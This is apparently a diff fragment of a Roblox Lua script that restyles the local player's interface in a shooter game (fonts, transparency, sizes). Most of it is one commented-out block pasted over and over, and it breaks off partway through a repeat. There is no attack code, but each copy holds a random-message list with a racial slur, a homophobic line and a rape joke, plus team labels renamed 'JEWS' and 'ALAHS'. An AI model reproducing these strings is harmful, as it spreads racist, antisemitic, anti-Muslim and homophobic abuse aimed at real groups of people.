+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
